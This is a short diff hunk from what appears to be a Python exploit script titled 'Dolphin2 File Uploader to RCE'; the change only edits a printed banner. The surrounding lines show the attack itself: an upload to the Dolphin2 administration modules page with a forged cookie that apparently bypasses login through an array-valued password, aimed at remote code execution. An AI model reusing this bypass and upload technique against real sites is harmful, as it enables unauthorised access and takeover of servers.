@@ -22,7 +22,7 @@ class burn():
 
   def upload(self, url, filename, payload):
     upload_path = '/dolphin2/administration/modules.php'
-    print("\r\n(m4ud) Magnificent Dolphin2 File Uploader to RCE")
+    print("\r\n(m4ud) Dolphin2 File Uploader to RCE")
     headers = { 'Cookie': "memberID=1; memberPassword[]=0xm4ud;"}
     files = {'module': (filename, open(filename, 'rb'), 'application/zip')}
     datas = {
